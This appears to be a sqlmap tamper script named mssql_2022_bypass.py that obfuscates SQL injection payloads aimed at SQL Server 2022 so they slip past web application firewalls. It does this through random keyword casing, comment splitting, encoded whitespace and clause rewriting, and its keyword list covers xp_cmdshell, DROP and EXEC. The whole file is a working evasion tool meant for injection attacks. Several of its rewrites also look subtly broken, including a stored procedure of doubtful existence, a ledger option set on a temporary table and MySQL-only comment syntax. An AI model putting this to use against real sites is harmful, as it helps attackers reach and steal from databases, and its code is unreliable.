#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2022_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|LEDGER|DISTINCT|BUCKET|GENERATE_SERIES|SYS\.TABLES|SYS\.COLUMNS|INFORMATION_SCHEMA|COLUMNS|DB_NAME|USER_NAME|XP_CMDSHELL)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "SYSDATETIME()", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "USER_NAME()" in payload.upper():
        payload = "CREATE TABLE #p (u NVARCHAR(100)) WITH (LEDGER=ON); INSERT INTO #p SELECT USER_NAME(); SELECT u FROM #p"

    if "=" in payload and "AND" in payload:
        payload = payload.replace("=", " IS NOT DISTINCT FROM ")

    if "GETDATE()" in payload.upper():
        payload = payload.replace("GETDATE()", "DATE_BUCKET(DAY, 1, GETDATE())")

    if re.search(r"id=\d+", payload.lower()):
        payload = re.sub(r"id=(\d+)", r"id IN (SELECT value FROM GENERATE_SERIES(\1, \1, 1))", payload)

    if "SELECT" in payload.upper() and "FROM" in payload.upper():
        payload = re.sub(r"(?i)SELECT\s+(.+)\s+FROM\s+([\w\.]+)", r"EXEC sp_sync_linked_database 'SynapseLink', '\2', 'SELECT \1 FROM \2'", payload)

    payload = general_obfuscate(payload)

    return payload
